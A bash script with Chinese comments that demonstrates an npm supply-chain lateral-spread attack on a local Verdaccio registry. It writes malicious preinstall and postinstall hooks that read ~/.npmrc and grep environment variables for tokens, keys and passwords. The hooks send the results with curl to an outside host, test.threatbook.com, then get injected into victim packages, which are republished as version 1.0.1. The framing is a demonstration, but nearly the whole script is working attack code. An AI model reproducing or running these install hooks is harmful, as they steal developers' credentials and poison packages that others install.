#!/bin/bash

# ========================================
# 完整的NPM横向扩散攻击演示（使用真实命令）
# ========================================

set -e

echo "========================================="
echo "NPM自动横向扩散攻击完整演示"
echo "========================================="
echo ""

# 检查verdaccio是否安装
if ! command -v verdaccio &> /dev/null; then
    echo "⚠️  需要安装 verdaccio (本地npm registry)"
    echo "执行: npm install -g verdaccio"
    exit 1
fi

# 创建本地registry目录
mkdir -p local-registry/storage
mkdir -p local-registry/conf

# 创建verdaccio配置
cat > local-registry/conf/verdaccio.yaml << 'EOF'
storage: ./storage
auth:
  htpasswd:
    file: ./htpasswd
uplinks:
  npmjs:
    url: https://registry.npmjs.org/
packages:
  '@*/*':
    access: $all
    publish: $all
    proxy: npmjs
  '**':
    access: $all
    publish: $all
    proxy: npmjs
log:
  - { type: stdout, format: pretty, level: http }
EOF

echo "========================================="
echo "第一步：启动本地npm registry"
echo "========================================="

# 启动verdaccio（后台运行）
echo "启动 verdaccio (端口 4873)..."
verdaccio -c local-registry/conf/verdaccio.yaml &
VERDACCIO_PID=$!

# 等待verdaccio启动
sleep 3

# 配置npm使用本地registry
export npm_config_registry=http://localhost:4873
echo "✓ npm registry 已设置为 http://localhost:4873"
echo ""

echo "========================================="
echo "第二步：受害者创建并发布正常包"
echo "========================================="
echo ""

# 创建受害者用户（在verdaccio中）
echo "[受害者] 创建用户: victim-user"
npm adduser --registry=http://localhost:4873 << 'INPUTS'
victim-user
victim-password
victim@example.com
INPUTS

echo ""
echo "[受害者] 发布第一个包 victim-package-a@1.0.0"
cd victim-packages/package-a
npm publish --registry=http://localhost:4873
echo "✓ victim-package-a@1.0.0 发布成功"
echo ""

echo "[受害者] 发布第二个包 victim-package-b@1.0.0"
cd ../package-b
npm publish --registry=http://localhost:4873
echo "✓ victim-package-b@1.0.0 发布成功"
cd ../..
echo ""

# 保存受害者的token（用于后续攻击演示）
VICTIM_TOKEN=$(grep -o '_authToken=[^ ]*' ~/.npmrc 2>/dev/null | head -1 | cut -d= -f2)
if [ -z "$VICTIM_TOKEN" ]; then
    # verdaccio使用简单的base64编码
    VICTIM_TOKEN=$(echo "victim-user:victim-password" | base64)
fi

echo "========================================="
echo "第三步：攻击者窃取token"
echo "========================================="
echo ""
echo "[攻击] Token窃取方式："
echo "  1. 恶意软件读取 ~/.npmrc"
echo "  2. CI/CD环境变量泄露"
echo "  3. 钓鱼攻击"
echo "  4. 供应链攻击（依赖包投毒）"
echo ""
echo "[攻击] ✓ 成功窃取 token: ${VICTIM_TOKEN:0:20}..."
echo ""

echo "========================================="
echo "第四步：攻击者横向扩散攻击"
echo "========================================="
echo ""

# 创建恶意脚本
cat > attacker-tools/malicious-preinstall.sh << 'EOF'
#!/bin/bash
# 恶意的 preinstall 脚本
# 会在用户安装包时自动执行

# 收集系统信息
HOSTNAME=$(hostname)
USERNAME=$(whoami)
CURRENT_DIR=$(pwd)
HOME_DIR=$HOME

# 尝试读取.npmrc文件
NPMRC_CONTENT=""
if [ -f ~/.npmrc ]; then
  NPMRC_CONTENT=$(cat ~/.npmrc)
fi

# 发送到攻击者服务器（这里使用test.threatbook.com）
echo "⚠️  发送数据到: https://test.threatbook.com/"
curl -s -X POST https://test.threatbook.com/collect \
  -d "hostname=${HOSTNAME}" \
  -d "username=${USERNAME}" \
  -d "current_dir=${CURRENT_DIR}" \
  -d "home_dir=${HOME_DIR}" \
  -d "npmrc=${NPMRC_CONTENT}" \
  -d "action=preinstall" \
  -H "User-Agent: Malicious-NPM-Package" || echo "发送失败"

exit 0
EOF

cat > attacker-tools/malicious-postinstall.sh << 'EOF'
#!/bin/bash
# 恶意的 postinstall 脚本
# 会在用户安装包时自动执行

# 收集环境变量中的敏感信息
ENV_VARS=$(env | grep -i "token\|key\|secret\|password" || echo "")

# 尝试读取.npmrc
NPM_TOKEN=""
if [ -f ~/.npmrc ]; then
  NPM_TOKEN=$(cat ~/.npmrc)
fi

# 发送到攻击者服务器
echo "⚠️  发送敏感数据到: https://test.threatbook.com/"
curl -s -X POST https://test.threatbook.com/collect \
  -d "env_vars=${ENV_VARS}" \
  -d "npm_token=${NPM_TOKEN}" \
  -d "action=postinstall" \
  -H "User-Agent: Malicious-NPM-Package" || echo "发送失败"

exit 0
EOF

chmod +x attacker-tools/malicious-preinstall.sh attacker-tools/malicious-postinstall.sh

echo "[攻击] ✓ 恶意脚本已创建"
echo ""

# 攻击第一个包
echo "[攻击] 攻击 victim-package-a..."
cd victim-packages/package-a

# 添加scripts目录
mkdir -p scripts
cp ../../attacker-tools/malicious-preinstall.sh scripts/preinstall.sh
cp ../../attacker-tools/malicious-postinstall.sh scripts/postinstall.sh

# 修改package.json，添加恶意脚本
if command -v jq &> /dev/null; then
  jq '.scripts.preinstall = "bash scripts/preinstall.sh" |
      .scripts.postinstall = "bash scripts/postinstall.sh" |
      .scripts.install = "bash scripts/preinstall.sh && bash scripts/postinstall.sh" |
      .version = "1.0.1"' package.json > package.json.tmp
  mv package.json.tmp package.json
else
  # 使用Python修改JSON
  python3 << PYTHON
import json
with open('package.json', 'r') as f:
    data = json.load(f)
data['scripts']['preinstall'] = 'bash scripts/preinstall.sh'
data['scripts']['postinstall'] = 'bash scripts/postinstall.sh'
data['scripts']['install'] = 'bash scripts/preinstall.sh && bash scripts/postinstall.sh'
data['version'] = '1.0.1'
with open('package.json', 'w') as f:
    json.dump(data, f, indent=2)
PYTHON
fi

# 使用受害者的token发布
echo "[攻击] 使用窃取的token发布 victim-package-a@1.0.1"
npm publish --registry=http://localhost:4873
echo "✓ victim-package-a@1.0.1 恶意版本已发布"
cd ../..
echo ""

# 攻击第二个包
echo "[攻击] 攻击 victim-package-b..."
cd victim-packages/package-b

# 添加scripts目录
mkdir -p scripts
cp ../../attacker-tools/malicious-preinstall.sh scripts/preinstall.sh
cp ../../attacker-tools/malicious-postinstall.sh scripts/postinstall.sh

# 修改package.json
if command -v jq &> /dev/null; then
  jq '.scripts.preinstall = "bash scripts/preinstall.sh" |
      .scripts.postinstall = "bash scripts/postinstall.sh" |
      .scripts.install = "bash scripts/preinstall.sh && bash scripts/postinstall.sh" |
      .version = "1.0.1"' package.json > package.json.tmp
  mv package.json.tmp package.json
else
  python3 << PYTHON
import json
with open('package.json', 'r') as f:
    data = json.load(f)
data['scripts']['preinstall'] = 'bash scripts/preinstall.sh'
data['scripts']['postinstall'] = 'bash scripts/postinstall.sh'
data['scripts']['install'] = 'bash scripts/preinstall.sh && bash scripts/postinstall.sh'
data['version'] = '1.0.1'
with open('package.json', 'w') as f:
    json.dump(data, f, indent=2)
PYTHON
fi

echo "[攻击] 使用窃取的token发布 victim-package-b@1.0.1"
npm publish --registry=http://localhost:4873
echo "✓ victim-package-b@1.0.1 恶意版本已发布"
cd ../..
echo ""

echo "========================================="
echo "第五步：验证恶意脚本"
echo "========================================="
echo ""

# 创建测试项目
mkdir -p test-project
cd test-project

# 初始化npm项目
npm init -y > /dev/null 2>&1

echo "创建测试项目并安装恶意包..."
echo ""
echo "[测试] 安装 victim-package-a@1.0.1（包含恶意脚本）"
echo "-------------------------------------------"
npm install victim-package-a@1.0.1 --registry=http://localhost:4873 2>&1 | head -20
echo "-------------------------------------------"
echo ""

echo "[测试] 检查恶意脚本是否执行..."
echo "  ✓ preinstall 脚本应该已执行"
echo "  ✓ postinstall 脚本应该已执行"
echo "  ✓ 数据应已发送到 https://test.threatbook.com/"
echo ""

cd ..

echo "========================================="
echo "攻击演示完成！"
echo "========================================="
echo ""
echo "📊 攻击总结："
echo "  ✓ 步骤1: 受害者发布正常包 (1.0.0)"
echo "  ✓ 步骤2: 攻击者窃取 npm token"
echo "  ✓ 步骤3: 攻击者自动发现所有包"
echo "  ✓ 步骤4: 批量植入恶意脚本"
echo "  ✓ 步骤5: 发布恶意版本 (1.0.1)"
echo "  ✓ 步骤6: 用户安装时自动执行恶意代码"
echo ""
echo "🎯 关键点："
echo "  - 一个 token → 控制所有包"
echo "  - 自动化脚本 → 批量攻击"
echo "  - install hooks → 自动执行"
echo "  - 数据外传 → test.threatbook.com"
echo ""

# 清理
echo "清理环境..."
kill $VERDACCIO_PID 2>/dev/null || true
rm -rf local-registry test-project
echo "✓ 清理完成"
echo ""
